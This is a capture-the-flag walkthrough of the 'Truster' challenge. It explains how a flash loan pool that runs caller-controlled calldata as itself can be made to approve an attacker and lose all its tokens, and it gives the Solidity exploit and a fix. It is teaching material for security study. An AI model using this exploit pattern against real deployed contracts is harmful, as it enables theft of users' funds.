## Challenge 3 Walkthrough: Truster

### Vulnerability

The vulnerability lies in the `flashLoan` function's unrestricted external call:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);  // ← executes any calldata on any target, as the pool

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }
    return true;
}
```

- `target` — fully caller-controlled, any contract address accepted
- `data` — fully caller-controlled, any calldata accepted
- The call executes **as the pool** (`msg.sender == address(pool)`)
- `borrower` and `target` are entirely independent — tokens go to `borrower`, the arbitrary call goes to `target`; the two are never linked
- No validation on what function is being called or who the target is

The decoupling of `borrower` from `target` is what makes this exploitable in a single transaction with zero tokens borrowed: the attacker sets `amount = 0` (no tokens move, repayment check trivially passes), `borrower = address(this)` (irrelevant), and `target = address(token)` with `data = approve(attacker, MAX)`. The pool executes the approval as itself — the loan amount is never part of the equation.

### Exploit

```solidity
function test_truster() public checkSolvedByPlayer {
    new TrusterExploiter(pool, token, recovery);
}
```

The entire attack runs atomically in `TrusterExploiter`'s constructor — deploy = attack = done in one transaction, satisfying the `vm.getNonce(player) == 1` constraint.

**Inside the constructor:**

```solidity
// Step 1: Encode approval calldata — pool will approve this contract as spender
bytes memory data = abi.encodeWithSignature(
    "approve(address,uint256)",
    address(this),
    _token.balanceOf(address(_pool))
);

// Step 2: Flash loan 0 tokens — amount is irrelevant, the call is what matters
// pool executes token.approve(address(this), 1_000_000e18) with pool as msg.sender
_pool.flashLoan(0, address(this), address(_token), data);

// Step 3: Pool has now approved us — drain everything to recovery
_token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
```

- **Step 1** — `amount = 0` means `balanceBefore == balanceAfter`, so the repayment check trivially passes. No tokens need to be borrowed or returned.
- **Step 2** — `target.functionCall(data)` runs `token.approve(exploiter, 1M DVT)` with `pool` as `msg.sender`. The pool unknowingly approves its own tokens to the attacker.
- **Step 3** — The approval is live the moment `flashLoan` returns. `transferFrom` immediately pulls all 1M DVT to recovery within the same constructor call.

### Why It Works

The root cause is that `functionCall` is a capability meant for flash loan receivers to do something useful with borrowed funds — but the pool executes it as itself, not as the borrower. Any contract that executes caller-controlled calldata as its own `msg.sender` is effectively handing over its identity to the caller.

There is no safe way to allow arbitrary external calls from a lending pool's own context. The fix is to either restrict `target` to the `borrower` address only, or remove the arbitrary call entirely and rely solely on the standard ERC3156 callback interface.

This is an **arbitrary external call vulnerability** — one transaction, zero tokens borrowed, full pool drained.
